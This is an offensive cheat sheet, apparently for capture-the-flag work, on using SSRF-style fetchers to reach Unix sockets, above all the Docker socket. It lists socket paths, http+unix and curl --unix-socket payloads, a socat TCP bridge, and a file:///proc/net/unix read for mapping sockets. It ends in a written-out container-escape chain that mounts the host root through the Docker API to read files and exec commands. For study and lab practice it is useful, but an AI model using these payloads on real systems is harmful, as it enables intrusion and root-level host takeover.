# Unix-socket — docker.sock and the socket-aware fetchers

A unix-domain socket isn't a URL — but several fetchers can speak
HTTP over one. The docker-socket is the canonical target.

---

## 1. The http+unix scheme

```text
http+unix://%2Fvar%2Frun%2Fdocker.sock/containers/json
http+unix://%2fvar%2frun%2fdocker.sock/info
http+unix://%2fvar%2frun%2fdocker.sock/version
   — the socket-path %-encoded as the authority — the path is the
     api-route — used by docker-client libraries and some custom
     fetchers — requires a fetcher that SPEAKS http-over-unix
```

Most url-fetchers don't know http+unix — it's a docker-client
convention — but a fetcher BUILT on the docker-sdk or a custom
http-client may take it — try it when docker-adjacent.

## 2. The curl-equivalent — for manual testing

```bash
# what the fetcher would need to do — the unix-socket call:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock http://localhost/version
# a fetcher that wraps THIS reaches the socket — most URL-fetches
# don't — but the socket may also be TCP-exposed on 2375
```

## 3. The socket-locations — where they live

```text
/var/run/docker.sock               — docker-api — the canonical
/run/docker.sock
/var/run/containerd/containerd.sock — containerd
/run/containerd/containerd.sock
/var/run/crio/crio.sock             — cri-o
/run/k3s/containerd/containerd.sock — k3s
/var/run/php/php7.4-fpm.sock        — php-fpm — FastCGI-over-unix
/var/run/php/php8.x-fpm.sock
/run/php-fpm/www.sock
/var/run/php-fpm.sock
/tmp/mysql.sock                      — mysql-unix
/var/run/mysqld/mysqld.sock
/var/lib/mysql/mysql.sock
/tmp/postgresql/.s.PGSQL.5432       — pg-unix
/var/run/redis/redis.sock           — redis-unix!
/run/redis/redis.sock
/var/run/memcached.sock             — memcached-unix
/var/run/supervisor.sock            — supervisord — xml-rpc
/run/supervisord.sock
/var/run/dbus/system_bus_socket     — dbus
/var/run/rpcbind.sock
/var/run/docker/metrics.sock
/var/run/containerd/containerd.sock.ttrpc
/run/udev/control
/var/run/libvirt/libvirt-sock        — libvirt — vm-control!
/var/run/cups/cups.sock              — cups
/var/run/snmpd.sock                  — snmp-agentx
/var/run/clamav/clamd.sock           — clamd — the scan-daemon —
                                       the SCAN-COMMAND is a
                                       file-read oracle!
/var/run/fail2ban/fail2ban.sock
/var/run/opensnmpd.sock
```

## 4. The unix-aware fetcher-shapes

```text
- the app's own code uses a unix-socket-client (docker-sdk etc)
  → the url-param can't reach it directly — the socket is an
    implementation-detail — BUT if the socket is TCP-forwarded
    (2375) → reachable via plain http — the tcp-bridge
- curl --unix-socket — a fetcher that invokes the curl-binary
  with attacker-controlled args → the arg is the door —
  "url" → arg-injection — different class — command-injection
- the http+unix:// scheme — docker-sdk-aware fetchers
- gopher:// — can't reach unix — gopher is tcp
```

## 5. The unix-socket-via-TCP bridge

```text
the socket is often FORWARDED to tcp — docker -H tcp://0.0.0.0:2375 —
   then http://127.0.0.1:2375/ reaches it — NO unix needed —
   check 2375 first — the socket-on-tcp is the common exposure
socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock —
   a common local-bridge — if the app-box runs it → 2375 reachable
```

## 6. The redis/memcached/fpm unix-sockets — alternate transports

```text
redis on a unix-socket → can't reach via tcp-fetch — the socket is
  a file — file:// READS the file but the socket isn't a data-file
  — the unix-socket needs a CONNECT — not reachable via read —
  the tcp-port is the reach — same for the others

php-fpm unix-socket → the FCGI-protocol over unix — needs a unix-
  aware client — gopher can't — the tcp-9000 is the reach — or a
  FastCGI-over-unix-aware fetcher — rare

mysql/pg unix-sockets — same — the wire-protocol over unix — the
  tcp-ports are the reach
```

## 7. The socket-READ trick — file:// on the socket

```text
file:///var/run/docker.sock — READS the socket-FILE — the file is
   a socket-inode — reading it gives nothing (or an error) — the
   socket is a channel not data — BUT its EXISTENCE is readable —
   "Connection refused" vs "Is a socket" vs "Permission denied" —
   the file-TYPE leaks through the error — socket-detection via
   file-read — the inventory-trick: check which sockets exist
```

## 8. The detection-path

```text
1. is a unix-socket in play? → /proc/net/unix via file:// — the
   socket-list! — the file reads the kernel's unix-socket table —
   the REAL map — no guessing:
   file:///proc/net/unix → lists every unix-socket — name+type+
   state → the socket-inventory without scanning
2. is the socket tcp-forwarded? → check 2375/2376 the usual way
3. is the fetcher unix-aware? → http+unix:// probe → works → the
   whole docker-api is yours
```

## 9. /proc/net/unix — the socket-map

```text
file:///proc/net/unix returns rows like:
  Num RefCount Protocol Flags Type St Inode Path
  0000 0 0 0 0001 03 12345 /var/run/docker.sock
  → the Path-column is the socket-list — which sockets exist —
    docker.sock, fpm.sock, redis.sock — the internal-service map
    the port-sweep can't show (they're not tcp-ports)
```

## 10. The escalation — when unix-reach works

```text
http+unix://…/containers/json works → the full docker-api:
  - list containers, read their env (flag-in-env!)
  - spawn: POST /containers/create {"Image":"alpine","Cmd":["cat",
    "/host/flag"],"HostConfig":{"Binds":["/:/host"]}}
    → the container mounts host-/ → reads the flag → the logs
    → GET /containers/<id>/logs → flag
  - exec: POST /containers/<id>/exec → a command inside — RCE
the socket is root-equivalent — the container-escape is the
  canonical chain — the flag on the HOST is one mount away
```
